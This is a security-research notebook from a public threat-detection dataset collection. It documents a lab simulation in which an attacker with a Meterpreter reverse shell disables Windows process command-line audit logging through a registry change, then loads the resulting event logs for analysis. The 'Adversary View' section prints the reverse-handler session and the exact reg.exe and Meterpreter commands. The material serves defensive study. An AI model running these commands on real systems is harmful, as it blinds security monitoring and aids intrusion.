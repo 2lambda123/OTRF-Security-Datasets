{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5cc07a15",
   "metadata": {},
   "source": [
    "# Disabling Process Command Line Logging via Registry Modification"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2e83c0f8",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ce96b64",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Jose Rodriguez @Cyb3rPandaH |\n",
    "| Creation Date     | 2022/07/03 |\n",
    "| Modification Date | 2022/08/18 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1562.002](https://attack.mitre.org/techniques/T1562/002) |\n",
    "| Tags              | reg,cmd,microsoft windows security auditing |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "19cf782f",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "After getting a shell with elevated privileges on the target, we used reg.exe to modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit registry key.\n",
    "Logging of command line in process creation events for Microsoft Windows Security Auditing was disabled by changing the registry value data from 1 to 0 in the ProcessCreationIncludeCmdLine_Enabled registry value.\n",
    "This dataset was generated using a Windows 10 Pro edition (Version:1903,OS Build:18362.30) and Kali Linux (Version:2022.2)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "222156fa",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f5d3a537",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_cmd_process_commandline_logging_disabled.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_cmd_process_commandline_logging_disabled.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_meterpreter_process_commandline_logging_disabled.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_meterpreter_process_commandline_logging_disabled.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3ee8bd40",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e33abd86",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "14ff9748",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | reg.exe | [reg.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg) |\n",
    "| Manual | Metasploit | [reg](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/base/sessions/command_shell.rb) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a867ab9",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "***** Using reg.exe\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.44; (UUID: kmnbsoc3) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 10 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-18 20:34:35 -0400 \n",
    "meterpreter > shell \n",
    "Process 5028 created. \n",
    "Channel 1 created. \n",
    "Microsoft Windows [Version 10.0.18362.30] \n",
    "(c) 2019 Microsoft Corporation. All rights reserved. \n",
    "C:\\Users\\pedro\\Downloads>reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /t REG_DWORD /v ProcessCreationIncludeCmdLine_Enabled /d 0 /f \n",
    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /t REG_DWORD /v ProcessCreationIncludeCmdLine_Enabled /d 0 /f \n",
    "The operation completed successfully. \n",
    "C:\\Users\\pedro\\Downloads> \n",
    "\n",
    "***** Using reg (Meterpreter)\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.44; (UUID: wqp60sgl) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 4 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-18 18:46:35 -0400 \n",
    "meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit' -v 'ProcessCreationIncludeCmdLine_Enabled' -t 'REG_DWORD' -d 0 \n",
    "Successfully set ProcessCreationIncludeCmdLine_Enabled of REG_DWORD. \n",
    "meterpreter > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5b891204",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bc6ff9cd",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1b2e6149",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_cmd_process_commandline_logging_disabled.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d8e3b02",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "41e8dcad",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "51716729",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17a6d58b",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6b072858",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) \n",
    "* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
